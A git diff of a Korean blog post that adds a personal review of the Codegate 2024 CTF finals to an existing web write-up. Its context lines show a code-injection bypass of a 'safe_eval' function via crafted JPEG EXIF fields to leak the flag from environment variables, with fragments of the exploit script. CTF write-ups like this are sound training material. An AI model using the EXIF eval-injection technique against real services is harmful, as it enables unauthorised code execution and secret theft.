@@ -8,9 +8,25 @@ draft: false
 
 ### Table of contents
 
-- writeup
+- [review](#review)
+- [writeup](#writeup)
   - [ShieldOSINT (437pt, 13solves)](#shildosint)
   - [combination (741pt, 6solves)](#combination)
+
+# Review
+
+![alt text](img/20240830_100131.jpg)
+
+코드게이트 본선에 처음으로 출전하게 되서 매우 기대가 됐었는데 기대 이상으로 신기하고 재밌는 경험이었다. ctf에서는 10등을 했다. 딱히 높은 등수는 아니지만 주분야인 웹을 2문제는 풀어서 만족했다. 특히 승찬이와 함께 이스라엘에서 온 ItayB, 호주에서 온 TheSavage Teddy와 얘기하면서 외국의 보안업계에 대해 알아도 보고 재밌게 대화했다.  
+그리고 드림핵에서 온 부스도 체험하고 뱃지도 받고, 문제 출제자분들이 진행하는 Writeup 세션까지 듣고 모르던 지식을 많이 배웠다.  
+감사하게도 일반부 1등 팀인 Blue Water과 Zellic에서 CTF 참가자 전체를 대상으로 애슐리 퀸즈를 사주셔서 7시에 다른 주니어 참가자들과 함께 밥을 먹었는데, 온라인에서만 대화하던 친구, 형들과 대화를 하니 진짜 정말 재밌었다. 6시 반쯤에 도착해 9시 좀 넘게까지 대화를 했는데 전혀 지루하지 않고 계속 얘기하고 싶을 정도였다.  
+정말 잊을 수 없는 경험이었고 이제 고3이 돼서 공부에 집중해야할 시기가 되었는데 그럼에도 불구하고 이 경험은 다시 한번 해보고 싶다!  
+  
+  
+
+PS. 코드게이트 대회 및 컨퍼런스 준비하신 모든 분들과 애슐리 초대해주신 Blue Water팀과 Zellic, 스벅 사주신 m0nd2y 선배, 그리고 재밌게 대화한 다른 주니어 CTF 형들과 친구들에게 감사드립니다!!  
+  
+PS. Thank you to everyone who prepared for the Codegate, Blue Water and Zellic that invited all ctf players to Ashyley, m0nd2y who bought drink, and other junior CTF brothers who had fun talking to each other!!
 
 # Writeup
 
@@ -256,6 +272,7 @@ class ShieldCloud : AuthenticationSuccessHandler {
 :::
 
 문제를 보면 누가봐도 수상한 `safe_eval` 이라는 함수가 있다.
+
 ```py
 def safe_eval(code_string):
     allowed_globals = {
@@ -271,7 +288,9 @@ def safe_eval(code_string):
         print(f"Error evaluating code: {e}")
         return None
 ```
+
 eval에 옵션을 추가한 것 같은데, 플래그는 환경변수에 있으므로 다음과 같은 테스트 코드를 작성해 `code_string` 파라메터에 어떤 문자를 입력해야 leak이 가능한지 테스트해보았다.
+
 ```py
 import os
 import re
@@ -315,12 +334,15 @@ def validate_ipv6(ipv6):
 a = safe_eval('os.environ')
 print(a)
 ```
+
 ```console
 exon@DESKTOP-541R960:/combination$ python3 test.py
 environ({'SHELL': '/bin/bash', 'NVM_RC_VERSION': '', 'WSL2_GUI_APPS_ENABLED': '1', 'WSL_DISTRO_NAME': 'Ubuntu', 'NAME': 'DESKTOP-541R960', 'PWD': '/mnt/d/hacking/ctf/2024/codegate/qual/web/combination', 'LOGNAME': 'exon', 'HOME': '/home/exon', 'LANG': 'C.UTF-8', 'WSL_INTEROP': '/run/WSL/1354_interop', ....
 ```
+
 성공적으로 도메인 필터링도 우회하면서 환경변수를 출력한다. 그럼 이제 어떤 로직을 통해서 `code_string` 파라메터를 조작할 수 있을지 분석해야 한다.  
 코드를 보다보면 이미지의 픽셀보다 exif 같은 정보들이 `code_string`에 영향을 주는 것을 알 수 있기에 exif 위주로 분석하면
+
 ```py
 elif file_ext in ['.jpg', '.jpeg']:
     exif_data = {}
@@ -345,7 +367,9 @@ elif file_ext in ['.jpg', '.jpeg']:
     print('exif_bytes: ', exif_bytes)
     bw_img.save(output_path, 'JPEG', exif=exif_bytes)
 ```
+
 일단 처음 `/upload` 에서는 jpg 또는 jpeg 파일의 형식일 때 exif를 두개를 합치는 것을 볼 수 있다. 이렇게 merge한 파일을 `/verify` 에서 인증을 받아야 하는데,
+
 ```py
 elif file_ext in ['.jpg', '.jpeg']:
     img = Image.open(new_file_path)                
@@ -394,16 +418,18 @@ elif file_ext in ['.jpg', '.jpeg']:
     except Exception as e:
         print('!!!!!!!!!!!!!!!!!!!!', e)
 ```
+
 참고로 중간중간 보이는 print 구문은 내가 디버깅하려고 추가한거다.  
 어쨌든 eval을 실행하기 위해서 해야할 것은 다음과 같은데
+
 1. `img.info['exif']`에 `b"CODEGATE2024\x00"` 가 존재해야함
 2. `img.info['exif']`에서 `b"CODEGATE2024\x00"` 이후에 모든 문자를 json으로 변환 할 때 오류가 없어야함
 3. `img._getexif()`의 `ImageDescription`이 도메인 체크 함수를 통과하고, 소괄호가 없어야함  
 
 처음 문제를 풀 때 1번은 쉽게 만족시켰지만 2번 조건을 해결하려고 할 때 json 형식으로 만들어놓은 exif 뒤에 자꾸 `\x00` null 문자가 생겨서 오류가 났었다. 나는 이를 해결하기 위해 exif에서 가장 마지막에 위치한 필드인 `UserComment` 필드를 사용해보았고 성공했다!!  
   
-  
 최종 익스코드는 다음과 같다.
+
 ```py
 from PIL import Image
 import piexif
@@ -443,6 +469,7 @@ print(res.text)
 res = s.request('TRACE', url+'/verify')
 print(eval(res.json()['debug'])['FLAG'])
 ```
+
 ```console
 exon@DESKTOP-541R960:/combination$ python3 ex.py
 {"message":"Files successfully uploaded and validated"}
